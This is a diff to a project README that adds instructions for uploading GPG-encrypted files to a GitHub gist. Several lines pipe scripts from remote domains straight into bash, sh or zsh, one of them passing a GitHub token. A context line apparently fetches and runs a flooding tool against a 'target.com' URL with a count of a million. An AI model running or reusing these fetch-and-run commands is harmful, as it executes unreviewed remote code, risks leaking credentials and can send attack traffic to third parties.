@@ -28,6 +28,14 @@ curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/boilerplate | bash 
 curl -L "gendos.site?args=https://target.com%20-n=1000000" | sh
 ```
 
+* [Upload encrypted stuff to your gist]()
+
+First create a github token [here](https://github.com/settings/tokens/new) if you haven't already used `hub login`.
+
+```
+curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/upload-gist | zsh -s <path-to-file> <name-of-gpg-recipient> [optional: <github-token-with-gist-permissions>]
+```
+
 ## License
 
 This project is licensed under the GPL-3 license.
